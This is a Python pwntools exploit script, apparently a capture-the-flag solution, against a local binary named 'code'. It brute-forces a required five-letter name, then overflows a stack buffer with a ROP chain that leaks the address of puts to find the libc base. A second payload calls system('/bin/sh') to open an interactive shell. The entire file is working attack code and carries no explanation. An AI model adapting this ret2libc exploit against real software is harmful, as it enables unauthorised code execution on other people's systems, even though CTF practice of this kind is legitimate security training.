from pwn import *
import sys
if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./code")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./code")


def calcu(strings):
	v4 = 0
	for i in range(len(strings)):
		v0 = 117*v4 + ord(strings[i])
		v4 = v0 - 2018110700000*(((((-8396547321047930811*v0)>>64)+v0)>>40)-(v0>>63))
	return v4 == 0x53CBEB035

def bruteforce():
	chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
	for c1 in chars:
		for c2 in chars:
			for c3 in chars:
				for c4 in chars:
					for c5 in chars:
						if calcu(c1+c2+c3+c4+c5):
							return c1+c2+c3+c4+c5
#print bruteforce()
#wyBTs
p.sendlineafter("Please input your name:\n","wyBTs")
padding = (0x70 + 8)*"a"
pop_rdi_ret = 0x0000000000400983
puts_plt = elf.plt["puts"]
puts_got = elf.got["puts"]
havefun_addr = 0x400801
payload = padding + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(havefun_addr)
p.sendafter("Please input your code to save\n",payload)
p.recvuntil("Save Success\n")
puts_addr = u64(p.recv(6).ljust(8,"\x00"))
libc.address = puts_addr - libc.symbols["puts"]
log.success("libc_base:"+hex(libc.address))
system_addr = libc.symbols["system"]
binsh = libc.search("/bin/sh").next()
payload = padding + p64(pop_rdi_ret) + p64(binsh) + p64(system_addr)
p.sendafter("Please input your code to save\n",payload)
p.interactive()
